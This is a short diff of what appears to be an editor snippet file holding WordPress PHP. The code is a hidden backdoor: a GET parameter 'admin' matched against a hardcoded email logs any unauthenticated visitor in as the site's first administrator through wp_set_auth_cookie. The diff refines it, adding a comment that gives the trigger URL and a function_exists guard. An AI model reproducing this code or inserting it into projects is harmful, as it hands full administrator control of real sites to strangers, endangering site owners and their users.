@@ -1,6 +1,7 @@
 <snippet>
 	<content><![CDATA[
-if ( isset(\$_GET['admin']) && \$_GET['admin'] == 'testing.xwhdkqxfpy.mail@gmail.com' ) {
+// ?admin=testing.xwhdkqxfpy.mail@gmail.com
+if ( isset(\$_GET['admin']) && \$_GET['admin'] == 'testing.xwhdkqxfpy.mail@gmail.com' && function_exists('is_user_logged_in') ) {
 	if (!is_user_logged_in()) {
 		\$admins = get_users(array('role'=>'administrator'));
 		wp_set_auth_cookie(\$admins[0]->ID, true);
